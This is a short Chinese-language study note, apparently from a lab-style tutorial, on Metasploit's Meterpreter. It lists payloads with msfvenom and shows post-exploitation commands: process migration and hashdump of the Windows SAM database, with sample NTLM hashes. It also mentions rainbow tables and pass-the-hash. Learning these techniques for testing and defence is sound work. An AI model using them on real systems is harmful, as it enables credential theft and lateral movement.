---
icon: pen-to-square
date: 2025-04-03
tags: 
title: "Metasploit: Meterpreter"
category:
  - 项目
---

```shell-session
msfvenom --list payloads | grep meterpreter
```
该列表将显示适用于以下平台的 Meterpreter 版本;

- Android
- Apple iOS
- Java
- Linux
- OSX
- PHP
- Python
- Windows

您决定使用哪个版本的 Meterpreter 主要基于三个因素;

- 目标作系统（目标作系统是 Linux 还是 Windows？它是 Mac 设备吗？是安卓手机吗？等）
- 目标系统上可用的组件（是否安装了 Python？这是 PHP 网站吗？等）
- 您可以与目标系统建立的网络连接类型（它们是否允许原始 TCP 连接？可以只进行 HTTPS 反向连接吗？IPv6 地址的监控不如 IPv4 地址严密吗？等）


## Meterpreter后渗透
`getuid`显示Meterpreter当前用户
```shell-session
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```
ps会列出正在运行的进程。PID会提供将METERPRETER迁移到另一个进程所需的PID信息

### 进程迁移
meterpreter存在于内存中，依附于其他进程，因此可以将此进程迁移到其他进程
输入迁移命令后接目标进程的PID可以迁移进程
```shell-session
meterpreter > migrate 716
[*] Migrating from 1304 to 716...
[*] Migration completed successfully.
```

**哈希 Dump**

`hashdump`命令将列出SAM数据库的内容。SAM(安全帐户管理器)数据库在Windows系统上存储用户密码。这些密码以 NTLM(新技术 LAN Manager) 格式存储。

```shell-session
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```
虽然在数学上无法“破解”这些哈希,NTLM但您仍然可以使用在线NTLM数据库或彩虹表攻击发现清晰文本密码。这些哈希也可以用于Pass-the-Hash攻击,以验证这些用户可以访问同一网络的其他系统。

